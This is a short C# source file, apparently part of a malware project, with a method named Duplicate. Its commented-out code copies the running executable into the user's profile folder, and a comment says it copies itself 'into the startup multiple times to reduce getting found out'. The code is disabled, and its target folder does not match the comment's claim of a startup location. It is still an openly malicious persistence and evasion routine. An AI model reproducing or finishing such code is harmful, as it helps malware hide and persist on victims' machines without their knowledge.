using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Karios
{
    class Duplication
    {
        public static void Duplicate()
        {
            //Copies itself into the startup multiple times to reduce getting found out
            /*
            if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
            {
                System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName, Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
            }
            */
        }
    }
}
